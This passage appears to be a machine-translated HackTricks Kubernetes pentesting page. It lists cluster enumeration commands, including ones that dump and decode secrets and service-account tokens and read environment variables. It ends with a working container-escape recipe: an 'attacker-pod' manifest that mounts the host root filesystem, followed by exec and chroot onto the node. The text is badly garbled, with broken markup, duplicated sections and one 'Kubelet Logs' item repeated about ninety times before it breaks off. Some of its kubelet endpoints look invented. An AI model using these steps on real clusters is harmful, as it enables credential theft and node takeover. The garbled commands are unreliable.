  - `kubectl describe persistentvolumeclaim PVC_NAME -n NAMESPACE`
- **Ergebnisse**:
  - Informationen zu den persistenten Volumenanspr√ºchen im Cluster

#### Umgebungsvariablen

- **Beschreibung**: Umgebungsvariablen k√∂nnen sensible Informationen wie Passw√∂rter oder API-Schl√ºssel enthalten.
- **Befehle**:
  - `kubectl get pods --all-namespaces -o=jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.containers[*].env[*].name}{"\t"}{.spec.containers[*].env[*].value}{"\n"}{end}'`
- **Ergebnisse**:
  - Liste von Pods und deren Umgebungsvariablen

#### Geheimnisse

- **Beschreibung**: Geheimnisse werden verwendet, um sensible Daten wie Passw√∂rter sicher zu speichern.
- **Befehle**:
  - `kubectl get secrets --all-namespaces`
  - `kubectl describe secret SECRET_NAME -n NAMESPACE`
- **Ergebnisse**:
  - Informationen zu den vorhandenen Geheimnissen im Cluster

#### ConfigMaps

- **Beschreibung**: ConfigMaps speichern Konfigurationsdaten als Schl√ºssel-Wert-Paare.
- **Befehle**:
  - `kubectl get configmaps --all-namespaces`
  - `kubectl describe configmap CONFIGMAP_NAME -n NAMESPACE`
- **Ergebnisse**:
  - Informationen zu den vorhandenen ConfigMaps im Cluster

#### Persistent Volume Claims

- **Beschreibung**: Persistent Volume Claims erm√∂glichen es Pods, auf persistenten Speicher zuzugreifen.
- **Befehle**:
  - `kubectl get persistentvolumeclaims --all-namespaces`
  - `kubectl describe persistentvolumeclaim PVC_NAME -n NAMESPACE`
- **Ergebnisse**:
  - Informationen zu den persistenten Volumenanspr√ºchen im Cluster

#### Endpunkte

- **Beschreibung**: Endpunkte sind Verbindungen zu Diensten innerhalb des Clusters.
- **Befehle**:
  - `kubectl get endpoints --all-namespaces`
  - `kubectl describe endpoints ENDPOINT_NAME -n NAMESPACE`
- **Ergebnisse**:
  - Informationen zu den Endpunkten im Cluster

#### Namespaces

- **Beschreibung**: Namespaces dienen dazu, Ressourcen in logische Gruppen zu unterteilen.
- **Befehle**:
  - `kubectl get namespaces`
  - `kubectl describe namespace NAMESPACE`
- **Ergebnisse**:
  - Informationen zu den vorhandenen Namespaces im Cluster

#### Dienste

- **Beschreibung**: Dienste erm√∂glichen die Exposition von Pods als Netzwerkdienste.
- **Befehle**:
  - `kubectl get services --all-namespaces`
  - `kubectl describe service SERVICE_NAME -n NAMESPACE`
- **Ergebnisse**:
  - Informationen zu den vorhandenen Diensten im Cluster

#### Rollen und Rollen-Bindungen

- **Beschreibung**: Rollen definieren Berechtigungen auf Namespace-Ebene, w√§hrend Rollen-Bindungen Rollen an Benutzer oder Service Accounts binden.
- **Befehle**:
  - `kubectl get roles --all-namespaces`
  - `kubectl get rolebindings --all-namespaces`
- **Ergebnisse**:
  - Liste der verf√ºgbaren Rollen und deren Bindungen

#### Pod-Sicherheitsrichtlinien

- **Beschreibung**: Pod-Sicherheitsrichtlinien legen Sicherheitsstandards f√ºr Pods fest.
- **Befehle**:
  - `kubectl get podsecuritypolicies --all-namespaces`
  - `kubectl describe podsecuritypolicy PSP_NAME -n NAMESPACE`
- **Ergebnisse**:
  - Informationen zu den Pod-Sicherheitsrichtlinien im Cluster

#### LimitRange

- **Beschreibung**: LimitRange definiert Ressourcenlimits f√ºr Pods in einem Namespace.
- **Befehle**:
  - `kubectl get limitranges --all-namespaces`
  - `kubectl describe limitrange LIMITRANGE_NAME -n NAMESPACE`
- **Ergebnisse**:
  - Informationen zu den LimitRanges im Cluster

#### StorageClasses

- **Beschreibung**: StorageClasses definieren verschiedene Arten von Speicher f√ºr Persistent Volume Claims.
- **Befehle**:
  - `kubectl get storageclasses`
  - `kubectl describe storageclass STORAGECLASS_NAME`
- **Ergebnisse**:
  - Informationen zu den verf√ºgbaren StorageClasses im Cluster

#### Custom Resource Definitions (CRDs)

- **Beschreibung**: CRDs erm√∂glichen die Erweiterung der Kubernetes-API mit benutzerdefinierten Ressourcen.
- **Befehle**:
  - `kubectl get crds`
  - `kubectl describe crd CRD_NAME`
- **Ergebnisse**:
  - Liste der verf√ºgbaren CRDs im Cluster

#### Helm-Releases

- **Beschreibung**: Helm-Releases sind Pakete von Kubernetes-Ressourcen, die mit Helm verwaltet werden.
- **Befehle**:
  - `kubectl get helmreleases --all-namespaces`
  - `kubectl describe helmrelease HELMRELEASE_NAME -n NAMESPACE`
- **Ergebnisse**:
  - Informationen zu den Helm-Releases im Cluster

#### Service-Meshes

- **Beschreibung**: Service-Meshes bieten Funktionen wie Lastausgleich, Sicherheit und √úberwachung f√ºr Microservices.
- **Befehle**:
  - `kubectl get servicemeshes --all-namespaces`
  - `kubectl describe servicemesh SERVICEMESH_NAME -n NAMESPACE`
- **Ergebnisse**:
  - Informationen zu den Service-Meshes im Cluster

#### Weitere Ressourcen

- **Befehle**:
  - `kubectl api-resources`
  - `kubectl api-versions`
- **Ergebnisse**:
  - Liste der verf√ºgbaren API-Ressourcen und -Versionen im Cluster

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
### Knoten abrufen

Holen Sie alle **Knoten, die im Cluster konfiguriert sind**.

{% tabs %}
{% tab title="kubectl" %}
```
k get nodes
```
{% endtab %}

{% tab title="API" %}{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
### Erhalte DaemonSets

**DaemonSets** erm√∂glichen es, sicherzustellen, dass ein **bestimmter Pod auf allen Knoten** des Clusters (oder auf den ausgew√§hlten) l√§uft. Wenn Sie den DaemonSet l√∂schen, werden auch die von ihm verwalteten Pods entfernt.
```
k get daemonsets
```
{% endtab %}

{% tab title="API" %} 

### Kubernetes-Enumeration

#### Service Accounts

1. **List all service accounts in the cluster:**

   ```bash
   kubectl get serviceaccounts --all-namespaces
   ```

2. **Get detailed information about a specific service account:**

   ```bash
   kubectl describe serviceaccount <service-account-name> -n <namespace>
   ```

3. **List all service account tokens in the cluster:**

   ```bash
   kubectl get secrets --all-namespaces | grep service-account-token
   ```

4. **Decode a service account token:**

   ```bash
   echo "<token>" | base64 -d
   ```

#### Pods

1. **List all pods in the cluster:**

   ```bash
   kubectl get pods --all-namespaces
   ```

2. **Get detailed information about a specific pod:**

   ```bash
   kubectl describe pod <pod-name> -n <namespace>
   ```

3. **List all environment variables in a pod:**

   ```bash
   kubectl exec <pod-name> -n <namespace> -- printenv
   ```

4. **Access the pod's shell:**

   ```bash
   kubectl exec -it <pod-name> -n <namespace> -- /bin/sh
   ```

#### Nodes

1. **List all nodes in the cluster:**

   ```bash
   kubectl get nodes
   ```

2. **Get detailed information about a specific node:**

   ```bash
   kubectl describe node <node-name>
   ```

3. **List all pods running on a specific node:**

   ```bashjson
   kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.nodeName=="<node-name>")'
   ```

#### RBAC

1. **List all roles in the cluster:**

   ```bash
   kubectl get roles --all-namespaces
   ```

2. **List all role bindings in the cluster:**

   ```bash
   kubectl get rolebindings --all-namespaces
   ```

3. **List all cluster roles in the cluster:**

   ```bash
   kubectl get clusterroles
   ```

4. **List all cluster role bindings in the cluster:**

   ```bash
   kubectl get clusterrolebindings
   ```

#### Network Policies

1. **List all network policies in the cluster:**

   ```bash
   kubectl get networkpolicies --all-namespaces
   ```

2. **Get detailed information about a specific network policy:**

   ```bash
   kubectl describe networkpolicy <network-policy-name> -n <namespace>
   ```

#### Storage Classes

1. **List all storage classes in the cluster:**

   ```bash
   kubectl get storageclasses
   ```

2. **Get detailed information about a specific storage class:**

   ```bash
   kubectl describe storageclass <storage-class-name>
   ```

#### Persistent Volumes

1. **List all persistent volumes in the cluster:**

   ```bash
   kubectl get persistentvolumes
   ```

2. **Get detailed information about a specific persistent volume:**

   ```bash
   kubectl describe persistentvolume <persistent-volume-name>
   ```

#### Secrets

1. **List all secrets in the cluster:**

   ```bash
   kubectl get secrets --all-namespaces
   ```

2. **Get detailed information about a specific secret:**

   ```bash
   kubectl describe secret <secret-name> -n <namespace>
   ```

3. **Decode a secret:**

   ```bash
   kubectl get secret <secret-name> -n <namespace> -o jsonpath="{.data.<data-key>}" | base64 -d
   ```

#### Config Maps

1. **List all config maps in the cluster:**

   ```bash
   kubectl get configmaps --all-namespaces
   ```

2. **Get detailed information about a specific config map:**

   ```bash
   kubectl describe configmap <config-map-name> -n <namespace>
   ```

{% endtab %}
```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
### Erhalten Sie Cronjob

Cron-Jobs erm√∂glichen es, mit einer Crontab-√§hnlichen Syntax die Planung des Starts eines Pods zu planen, der eine bestimmte Aktion ausf√ºhrt.

{% tabs %}
{% tab title="kubectl" %}
```
k get cronjobs
```
{% endtab %}

{% tab title="API" %} 

### Kubernetes-Enumeration

#### Kubelet

1. **API-Server**

   1.1. Get the API-Server IP from the kubelet service:

   ```bash
   curl -s http://localhost:10255/pods/ | jq -r '.items[].status.hostIP' | sort -u
   ```

   1.2. Get the API-Server IP from the kubelet service (alternative method):

   ```bash
   curl -s http://localhost:10255/pods/ | jq -r '.items[].status.podIP' | sort -u
   ```

2. **Service-Account Token**

   2.1. Get the service-account token from the kubelet service:

   ```bash
   curl -s http://localhost:10255/secrets/ | jq -r '.items[].metadata.name' | sort -u
   ```

   2.2. Get the service-account token content:

   ```bash
   curl -s http://localhost:10255/secrets/<secret_name> | jq -r '.data.token' | base64 -d
   ```

3. **Kubelet Version**

   3.1. Get the kubelet version:

   ```bash
   curl -s http://localhost:10255/version
   ```

4. **Kubelet Configuration**

   4.1. Get the kubelet configuration:

   ```bash
   curl -s http://localhost:10255/configz
   ```

5. **Kubelet Logs**

   5.1. Get the kubelet logs:

   ```bash
   curl -s http://localhost:10255/logs/
   ```

6. **Kubelet RunPodSandbox**

   6.1. Check if you can run a pod sandbox:

   ```bash
   curl -s http://localhost:10255/runPodSandbox
   ```

7. **Kubelet Exec**

   7.1. Check if you can execute commands in a pod:

   ```bash
   curl -s http://localhost:10255/exec
   ```

8. **Kubelet Port-Forward**

   8.1. Check if you can port-forward to a pod:

   ```bash
   curl -s http://localhost:10255/portForward
   ```

9. **Kubelet Attach**

   9.1. Check if you can attach to a pod:

   ```bash
   curl -s http://localhost:10255/attach
   ```

10. **Kubelet Logs**

    10.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

11. **Kubelet Metrics**

    11.1. Get the kubelet metrics:

    ```bash
    curl -s http://localhost:10255/metrics
    ```

12. **Kubelet Healthz**

    12.1. Check the kubelet health:

    ```bash
    curl -s http://localhost:10255/healthz
    ```

13. **Kubelet CRI-Socket**

    13.1. Check the CRI socket:

    ```bash
    curl -s http://localhost:10255/cri/ | jq
    ```

14. **Kubelet Logs**

    14.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

15. **Kubelet Logs**

    15.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

16. **Kubelet Logs**

    16.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

17. **Kubelet Logs**

    17.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

18. **Kubelet Logs**

    18.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

19. **Kubelet Logs**

    19.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

20. **Kubelet Logs**

    20.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

21. **Kubelet Logs**

    21.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

22. **Kubelet Logs**

    22.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

23. **Kubelet Logs**

    23.1. Get the kubelet logs:

    ```bash
    curl -s http://jsonpath.com
    ```

24. **Kubelet Logs**

    24.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

25. **Kubelet Logs**

    25.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

26. **Kubelet Logs**

    26.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

27. **Kubelet Logs**

    27.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

28. **Kubelet Logs**

    28.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

29. **Kubelet Logs**

    29.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

30. **Kubelet Logs**

    30.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

31. **Kubelet Logs**

    31.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

32. **Kubelet Logs**

    32.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

33. **Kubelet Logs**

    33.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

34. **Kubelet Logs**

    34.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

35. **Kubelet Logs**

    35.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

36. **Kubelet Logs**

    36.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

37. **Kubelet Logs**

    37.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

38. **Kubelet Logs**

    38.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

39. **Kubelet Logs**

    39.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

40. **Kubelet Logs**

    40.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

41. **Kubelet Logs**

    41.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

42. **Kubelet Logs**

    42.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

43. **Kubelet Logs**

    43.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

44. **Kubelet Logs**

    44.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

45. **Kubelet Logs**

    45.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

46. **Kubelet Logs**

    46.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

47. **Kubelet Logs**

    47.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

48. **Kubelet Logs**

    48.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

49. **Kubelet Logs**

    49.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

50. **Kubelet Logs**

    50.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

51. **Kubelet Logs**

    51.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

52. **Kubelet Logs**

    52.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

53. **Kubelet Logs**

    53.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

54. **Kubelet Logs**

    54.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

55. **Kubelet Logs**

    55.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

56. **Kubelet Logs**

    56.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

57. **Kubelet Logs**

    57.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

58. **Kubelet Logs**

    58.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

59. **Kubelet Logs**

    59.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

60. **Kubelet Logs**

    60.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

61. **Kubelet Logs**

    61.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

62. **Kubelet Logs**

    62.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

63. **Kubelet Logs**

    63.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

64. **Kubelet Logs**

    64.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

65. **Kubelet Logs**

    65.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

66. **Kubelet Logs**

    66.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

67. **Kubelet Logs**

    67.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

68. **Kubelet Logs**

    68.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

69. **Kubelet Logs**

    69.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

70. **Kubelet Logs**

    70.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

71. **Kubelet Logs**

    71.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

72. **Kubelet Logs**

    72.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

73. **Kubelet Logs**

    73.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

74. **Kubelet Logs**

    74.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

75. **Kubelet Logs**

    75.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

76. **Kubelet Logs**

    76.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

77. **Kubelet Logs**

    77.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

78. **Kubelet Logs**

    78.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

79. **Kubelet Logs**

    79.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

80. **Kubelet Logs**

    80.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

81. **Kubelet Logs**

    81.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

82. **Kubelet Logs**

    82.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

83. **Kubelet Logs**

    83.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

84. **Kubelet Logs**

    84.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

85. **Kubelet Logs**

    85.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

86. **Kubelet Logs**

    86.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

87. **Kubelet Logs**

    87.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

88. **Kubelet Logs**

    88.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

89. **Kubelet Logs**

    89.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

90. **Kubelet Logs**

    90.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

91. **Kubelet Logs**

    91.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

92. **Kubelet Logs**

    92.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

93. **Kubelet Logs**

    93.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

94. **Kubelet Logs**

    94.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

95. **Kubelet Logs**

    95.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

96. **Kubelet Logs**

    96.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

97. **Kubelet Logs**

    97.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

98. **Kubelet Logs**

    98.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

99. **Kubelet Logs**

    99.1. Get the kubelet logs:

    ```bash
    curl -s http://localhost:10255/logs/
    ```

100. **Kubelet Logs**

    100.1. Get the kubelet logs:

    ```bash
    curl
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
### Erhalten von configMap

configMap enth√§lt immer viele Informationen und Konfigurationsdateien, die den in Kubernetes ausgef√ºhrten Apps bereitgestellt werden. Normalerweise finden Sie viele Passw√∂rter, Geheimnisse und Tokens, die zur Verbindung und Validierung mit anderen internen/externen Diensten verwendet werden.

{% tabs %}

{% tab title="kubectl" %}
```
k get configmaps # -n namespace
```
{% endtab %}

{% tab title="API" %} 

### Kubernetes-Enumeration

#### Service Accounts

- **Beschreibung**: Service Accounts sind standardm√§√üig in jedem Namespace vorhanden und k√∂nnen verwendet werden, um Pods zu authentifizieren.
- **Befehle**:
  - `kubectl get serviceaccounts --all-namespaces`: Zeigt alle Service Accounts in allen Namespaces an.
  - `kubectl get serviceaccounts <service-account-name> -n <namespace>`: Zeigt Informationen zu einem bestimmten Service Account an.
- **Potenzielle Auswirkungen**: Ein Angreifer kann versuchen, die Berechtigungen des Service Accounts zu missbrauchen, um auf Ressourcen zuzugreifen oder Aktionen im Cluster auszuf√ºhren.

#### Secrets

- **Beschreibung**: Secrets werden verwendet, um sensible Informationen wie Passw√∂rter, Tokens oder Zertifikate zu speichern.
- **Befehle**:
  - `kubectl get secrets --all-namespaces`: Zeigt alle Secrets in allen Namespaces an.
  - `kubectl get secrets <secret-name> -n <namespace>`: Zeigt Informationen zu einem bestimmten Secret an.
- **Potenzielle Auswirkungen**: Ein Angreifer kann versuchen, sensible Informationen aus den Secrets zu extrahieren, um Zugriff auf gesch√ºtzte Ressourcen zu erhalten.

#### ConfigMaps

- **Beschreibung**: ConfigMaps werden verwendet, um Konfigurationsdaten in Form von Schl√ºssel-Wert-Paaren zu speichern.
- **Befehle**:
  - `kubectl get configmaps --all-namespaces`: Zeigt alle ConfigMaps in allen Namespaces an.
  - `kubectl get configmaps <configmap-name> -n <namespace>`: Zeigt Informationen zu einer bestimmten ConfigMap an.
- **Potenzielle Auswirkungen**: Ein Angreifer kann versuchen, sensible Konfigurationsdaten aus den ConfigMaps zu extrahieren, um Schwachstellen im Cluster auszunzen.

#### Ingress

- **Beschreibung**: Ingress-Ressourcen definieren den Zugriff auf HTTP- und HTTPS-Routen von au√üerhalb des Clusters.
- **Befehle**:
  - `kubectl get ingresses --all-namespaces`: Zeigt alle Ingress-Ressourcen in allen Namespaces an.
  - `kubectl get ingresses <ingress-name> -n <namespace>`: Zeigt Informationen zu einer bestimmten Ingress-Ressource an.
- **Potenzielle Auswirkungen**: Ein Angreifer kann versuchen, Schwachstellen in der Konfiguration von Ingress-Ressourcen auszunutzen, um nicht autorisierten Zugriff auf Anwendungen im Cluster zu erlangen.

#### Network Policies

- **Beschreibung**: Network Policies legen fest, wie Pods miteinander und mit anderen Ressourcen kommunizieren k√∂nnen.
- **Befehle**:
  - `kubectl get networkpolicies --all-namespaces`: Zeigt alle Network Policies in allen Namespaces an.
  - `kubectl get networkpolicies <network-policy-name> -n <namespace>`: Zeigt Informationen zu einer bestimmten Network Policy an.
- **Potenzielle Auswirkungen**: Ein Angreifer kann versuchen, die Netzwerkkommunikation im Cluster zu manipulieren, um Zugriff auf sensible Daten oder Ressourcen zu erhalten.

#### Persistent Volumes

- **Beschreibung**: Persistent Volumes sind Speicherressourcen, die von Pods genutzt werden k√∂nnen.
- **Befehle**:
  - `kubectl get persistentvolumes`: Zeigt alle Persistent Volumes im Cluster an.
  - `kubectl get persistentvolumeclaims --all-namespaces`: Zeigt alle Persistent Volume Claims in allen Namespaces an.
- **Potenzielle Auswirkungen**: Ein Angreifer kann versuchen, auf ungesch√ºtzte Persistent Volumes zuzugreifen, um Daten zu stehlen oder zu manipulieren.

#### Roles und Role Bindings

- **Beschreibung**: Roles definieren Berechtigungen auf Ressourcenebene, w√§hrend Role Bindings diese Roles mit Benutzern oder Service Accounts verkn√ºpfen.
- **Befehle**:
  - `kubectl get roles --all-namespaces`: Zeigt alle Roles in allen Namespaces an.
  - `kubectl get rolebindings --all-namespaces`: Zeigt alle Role Bindings in allen Namespaces an.
- **Potenzielle Auswirkungen**: Ein Angreifer kann versuchen, √ºber unzureichend konfigurierte Roles und Role Bindings erh√∂hte Berechtigungen im Cluster zu erlangen.

#### Pod Security Policies

- **Beschreibung**: Pod Security Policies legen fest, welche Sicherheitsrichtlinien Pods einhalten m√ºssen.
- **Befehle**:
  - `kubectl get podsecuritypolicies --all-namespaces`: Zeigt alle Pod Security Policies im Cluster an.
- **Potenzielle Auswirkungen**: Ein Angreifer kann versuchen, Pods zu erstellen, die die definierten Sicherheitsrichtlinien umgehen, um b√∂sartige Aktionen im Cluster auszuf√ºhren.

#### Custom Resource Definitions (CRDs)

- **Beschreibung**: CRDs erm√∂glichen die Erweiterung der Kubernetes-API durch benutzerdefinierte Ressourcentypen.
- **Befehle**:
  - `kubectl get customresourcedefinitions.apiextensions.k8s.io`: Zeigt alle CRDs im Cluster an.
- **Potenzielle Auswirkungen**: Ein Angreifer kann versuchen, Schwachstellen in benutzerdefinierten Ressourcentypen auszunutzen, um das Verhalten des Clusters zu manipulieren.

#### Weitere Befehle

- `kubectl get pods --all-namespaces`: Zeigt alle Pods in allen Namespaces an.
- `kubectl get deployments --all-namespaces`: Zeigt alle Deployments in allen Namespaces an.
- `kubectl get services --all-namespaces`: Zeigt alle Services in allen Namespaces an.
- `kubectl get nodes`: Zeigt alle Nodes im Cluster an.
- `kubectl get namespaces`: Zeigt alle Namespaces im Cluster an.

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
### Holen Sie sich "alle"

{% tabs %}
{% tab title="kubectl" %}
```
k get all
```
### **Pod-Verbrauch erhalten**

{% tabs %}
{% tab title="kubectl" %}
```
k top pod --all-namespaces
```
{% endtab %}
{% endtabs %}

### Entkommen aus dem Pod

Wenn Sie in der Lage sind, neue Pods zu erstellen, k√∂nnten Sie in der Lage sein, aus ihnen auf den Knoten zu entkommen. Um dies zu tun, m√ºssen Sie einen neuen Pod mithilfe einer YAML-Datei erstellen, zum erstellten Pod wechseln und dann in das System des Knotens chrooten. Sie k√∂nnen bereits vorhandene Pods als Referenz f√ºr die YAML-Datei verwenden, da sie vorhandene Bilder und Pfade anzeigen.
```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```
> Wenn Sie ein Pod auf einem bestimmten Knoten erstellen m√ºssen, k√∂nnen Sie den folgenden Befehl verwenden, um die Labels auf dem Knoten zu erhalten
>
> `k get nodes --show-labels`
>
> √úblicherweise sind kubernetes.io/hostname und node-role.kubernetes.io/master alle gute Labels zur Auswahl.
>
> [reference]: https://kubernetes.io/docs/concepts/scheduling-eviction/assign-pod-node/

Dann erstellen Sie Ihre attack.yaml Datei
```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
command: ["/bin/sh", "-c", "sleep infinity"]
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```
Nachdem Sie das getan haben, erstellen Sie das Pod.
```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```
Jetzt k√∂nnen Sie zum erstellten Pod wie folgt wechseln:
```bash
kubectl exec -it attacker-pod [-n <namespace>] -- sh # attacker-pod is the name defined in the yaml file
```
Und schlie√ülich chrooten Sie in das System des Knotens
```bash
chroot /root /bin/bash
```
Informationen erhalten von: [Kubernetes Namespace Breakout using Insecure Host Path Volume ‚Äî Teil 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [Angriff und Verteidigung von Kubernetes: Bust-A-Kube ‚Äì Episode 1](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

## Referenzen

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" %}

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
